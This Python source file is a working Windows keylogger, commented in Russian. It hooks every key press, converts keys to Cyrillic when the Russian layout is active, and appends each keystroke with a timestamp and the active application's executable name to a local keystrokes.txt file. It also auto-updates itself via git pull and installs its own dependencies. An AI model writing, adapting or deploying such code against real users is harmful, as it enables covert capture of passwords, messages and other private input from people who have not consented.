import os
import importlib
import subprocess
import ctypes
from datetime import datetime

log_file = 'keystrokes.txt'
dependencies = ['keyboard', 'pywin32']

def git_update():
    subprocess.run(['git', 'pull'], check=False)

def install_dependencies(dependencies):
    for package in dependencies:
        subprocess.run(['python', '-m', 'pip', 'install', package], check=True)

def get_keyboard_layout():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    thread_id = user32.GetWindowThreadProcessId(user32.GetForegroundWindow(), None)
    layout_id = user32.GetKeyboardLayout(thread_id)
    return layout_id & (2**16 - 1)  # Возвращает идентификатор раскладки в десятичном формате

def get_active_window_title():
    try:
        import win32gui
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "null"

def get_active_window_app():
    try:
        hwnd = win32gui.GetForegroundWindow()
        # Получаем ID процесса
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        # Открываем процесс по ID
        PROCESS_QUERY_INFORMATION = 0x0400
        PROCESS_VM_READ = 0x0010
        h_process = win32api.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
        # Получаем путь к исполняемому файлу
        exe_name = win32process.GetModuleFileNameEx(h_process, 0)
        win32api.CloseHandle(h_process)
        # Возвращаем только имя файла
        return os.path.basename(exe_name)
    except Exception as e:
        print(f"Error: {e}")
        return "null"

def on_key_press(event):
    # win_title = get_active_window_title()
    win_app_name = get_active_window_app()
    _time = datetime.now().strftime("%d:%m:%y %H:%M:%S")
    layout = get_keyboard_layout()

    # Получаем символ в соответствии с раскладкой
    if layout == 0x409:  # EN-US
        char = event.name
    elif layout == 0x419:  # RU
        # Маппинг клавиш для русской раскладки
        ru_keys = {
            'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г',
            'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы',
            'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
            ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и',
            'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю'
        }
        char = ru_keys.get(event.name, event.name)  # Если нет специального символа, возвращаем как есть
    else:
        char = event.name  # Если неизвестная раскладка, возвращаем как есть

    with open(log_file, 'a') as f:
        f.write(f'{_time}[;]{win_app_name}[;]{char}\n')

def run():
    keyboard.on_press(on_key_press)
    keyboard.wait()

if __name__ == "__main__":
    git_update()
    try:
        from win32 import win32gui, win32process, win32api
        import keyboard
    except ImportError:
        install_dependencies(dependencies)
        from win32 import win32gui, win32process, win32api
        import keyboard

    run()
